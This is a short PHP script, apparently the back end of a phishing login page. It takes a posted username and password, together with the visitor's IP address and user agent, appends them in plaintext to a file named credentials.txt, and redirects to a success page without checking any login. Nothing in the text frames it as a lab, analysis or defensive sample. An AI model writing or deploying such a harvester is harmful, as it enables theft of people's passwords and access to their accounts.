<?php
// Capture login credentials
if ($_POST) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $date = date('Y-m-d H:i:s');
    
    // Log credentials to a file
    $log = "[$date] IP: $ip, Username: $username, Password: $password, User-Agent: $useragent\n";
    file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Redirect to show success message
    header('Location: success.html');
    exit();
}
?>